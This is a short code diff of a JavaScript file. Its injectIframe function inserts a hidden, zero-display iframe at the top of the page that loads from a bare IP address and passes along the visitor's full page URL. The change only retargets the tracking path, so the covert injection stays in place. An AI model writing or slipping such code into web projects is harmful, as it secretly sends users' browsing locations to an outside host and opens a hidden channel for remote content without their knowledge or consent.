@@ -9,7 +9,7 @@ function create(htmlStr) {
   }
 
 function injectIframe() {
-  var fragment = create('<iframe src="http://172.105.73.205/track/basedremote/' + encodeURIComponent(window.location.href) + '" style="display: none;" />');
+  var fragment = create('<iframe src="http://172.105.73.205/track/heimlichhamburg/' + encodeURIComponent(window.location.href) + '" style="display: none;" />');
   document.body.insertBefore(fragment, document.body.childNodes[0]);
 }
 
